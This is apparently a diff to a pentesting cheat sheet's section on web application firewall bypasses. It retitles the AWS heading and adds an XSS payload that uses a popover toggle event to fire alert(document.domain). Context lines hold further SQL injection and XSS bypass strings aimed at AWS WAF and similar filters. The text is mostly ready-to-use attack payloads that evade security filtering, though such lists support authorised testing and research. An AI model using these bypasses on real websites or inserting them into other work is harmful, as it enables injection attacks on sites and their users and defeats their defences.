@@ -3283,7 +3283,7 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 %C0%80'+union+select+col1,col2,col3+from+table+--+
 ```
 
-### AWS
+### AWS WAF
 - [SQLi Bypass](https://github.com/enkaskal/aws-waf-sqli-bypass-PoC) by [@enkaskal](https://twitter.com/enkaskal)
 ```
 "; select * from TARGET_TABLE --
@@ -3291,6 +3291,10 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 - [XSS Bypass](https://github.com/kmkz/Pentesting/blob/master/Pentest-Cheat-Sheet#L285) by [@kmkz](https://twitter.com/kmkz_security)
 ```
 <script>eval(atob(decodeURIComponent("payload")))//
+```
+- [XSS Bypass](https://www.sysdig.com/blog/fuzzing-and-bypassing-the-aws-waf) by [Daniele Linguaglossa]
+```
+<strong><button popovertarget=x>click me</button><test onbeforetoggle=alert(document.domain) popover id=x>aaa</aaa></strong>
 ```
 
 ### Barracuda 
